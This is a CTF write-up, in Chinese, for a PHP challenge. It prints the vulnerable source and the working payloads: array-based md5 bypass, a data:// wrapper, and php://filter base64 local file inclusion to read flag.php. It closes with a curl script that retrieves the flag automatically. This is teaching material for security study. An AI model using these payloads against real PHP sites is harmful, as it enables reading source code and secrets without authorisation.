#Web #PHP #伪协议 #LFI

```php
<?php
error_reporting(0);
highlight_file(__FILE__);

if (!isset($_GET['a']) || !isset($_GET['b']))
    die('Never gonna give you up');

$a = $_GET['a'];
$b = $_GET['b'];

if ($a == $b || md5($a) != md5($b)) {
    die('Never gonna let you down');
}

if (!isset($_GET['c'])) {
    die('Never gonna run around and desert you');
}

if (file_get_contents($_GET['c']) !== 'Never gonna make you cry') {
    die('Never gonna say goodbye');
}

if (!isset($_GET['d'])) {
    $_GET['d'] = 'flag.php';
    echo 'Never gonna tell a lie and hurt you';
}

include $_GET['d'];
```

---

#1
===

```php
if ($a == $b || md5($a) != md5($b)) {
    die('Never gonna let you down');
}
```

这里要求`$a`与`$b`不相等，且对两者进行md5的结果相等

有很多方法可以绕过，比较简单的方法是传递数组

对于老版本的php的md5函数，如果参数为非字符串，将会返回NULL，构造两个不同的数组a和b，md5的结果均为NULL，于是通过了这关

也可以看看利用弱类型特性的`0e`绕过和比较简单直接的md5碰撞～

```
/?a[]=1&b[]=2
```

#2
===

```php
if (file_get_contents($_GET['c']) !== 'Never gonna make you cry') {
    die('Never gonna say goodbye');
}
```

这里要求文件读取的结果为`'Never gonna make you cry'`，通过data伪协议绕过（php的`file_get_contents`，`include`这类函数一般都是支持伪协议的！）

```
/?a[]=1&b[]=2&c=data://text/plain,Never gonna make you cry
```

#3
===

```php
if (!isset($_GET['d'])) {
    $_GET['d'] = 'flag.php';
    echo 'Never gonna tell a lie and hurt you';
}

include $_GET['d'];
```

这里主要是提示可以对`flag.php`进行读取~~（其实是我把创建flag文件的代码写flag.php里了qwq）~~

如果直接`include`的话，就是通过php解释器执行代码了，所以要换个方法，让php的解释器不认它

一种可行的方法是使用php的伪协议，利用`php://filter`将文件内容进行base64编码后再读取，这样就不会有php标签啦

```
/?a[]=1&b[]=2&c=data://text/plain,Never gonna make you cry&d=php://filter/read=convert.base64-encode/resource=flag.php
```

> PD9waHAKJGZsYWcgPSAkX0VOVlsnRkxBRyddID8/ICdTcGlyaXR7ZmFrZS1mbGFnLXF3cX0nOwpmaWxlX3B1dF9jb250ZW50cygnc3Bpcml0ZmxhZ3F3cScsICRmbGFnKTsK

```shell
echo '...' | base64 -d
```

```php
<?php
$flag = $_ENV['FLAG'] ?? 'Spirit{fake-flag-qwq}';
file_put_contents('spiritflagqwq', $flag);
```

然后再直接读取`spiritflagqwq`就好了～

```
/?a[]=1&b[]=2&c=data://text/plain,Never gonna make you cry&d=php://filter/read=convert.base64-encode/resource=spiritflagqwq
```

如果读取没有结果可以先去一遍参数d，执行一遍flag.php来写入（逃

---

一键获得flag

```shell
#!/bin/bash

host="http://<host>:<port>/"
a='a[]=1'
b='b[]=2'
c='c=data://text/plain,Never+gonna+make+you+cry'
d='d=php://filter/read=convert.base64-encode/resource=spiritflagqwq'

curl -s -G \
    --data "$a" \
    --data "$b" \
    --data "$c" \
    "$host" > /dev/null
	
curl -s -G \
    --data "$a" \
    --data "$b" \
    --data "$c" \
    --data "$d" \
    "$host" |
    tail -n 1 |
    sed 's/<\/code>\(.*\)/\1/' |
    base64 -d
```